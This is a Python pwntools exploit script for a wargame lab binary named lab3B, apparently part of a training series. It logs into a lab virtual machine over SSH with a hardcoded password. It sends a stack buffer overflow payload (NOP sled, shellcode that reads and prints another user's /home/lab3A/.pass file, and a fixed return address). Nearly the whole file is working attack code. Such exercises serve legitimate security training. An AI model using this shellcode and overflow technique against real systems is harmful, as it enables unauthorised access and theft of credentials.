#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template lab3B --user lab3B --pass 'th3r3_iz_n0_4dm1ns_0n1y_U!' --host 192.168.56.101 --path /levels/lab03/lab3B
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab3B')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '192.168.56.101'
port = int(args.PORT or 22)
user = args.USER or 'lab3B'
password = args.PASSWORD or 'th3r3_iz_n0_4dm1ns_0n1y_U!'
remote_path = '/levels/lab03/lab3B'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

context.terminal = ['xfce4-terminal', '-e']
io = start()

rop = ROP(exe, badchars='\n')
rop.open()

buff_addr = 0xdeadbeef
shellcode = shellcraft.open('/home/lab3A/.pass') + \
            shellcraft.read(3, buff_addr, 128) + \
            shellcraft.write(1, buff_addr, 128)
print (shellcode.rstrip())
shellcode = asm(shellcode)
print (shellcode)

cyclic_len = cyclic_find(0x6261616f)
payload = "\x90" * 10 + shellcode + "\x90" * (cyclic_len - 10 - len(shellcode))
payload += p32(0xbffff660 + 3)
print ( "\\x".join("{:02x}".format(ord(c)) for c in payload))

print (cyclic(len(payload)))

io.recvuntil('\n')
io.sendline(payload)



#io.send(payload)
#flag = io.recv(...)
#log.success(flag)

io.interactive()

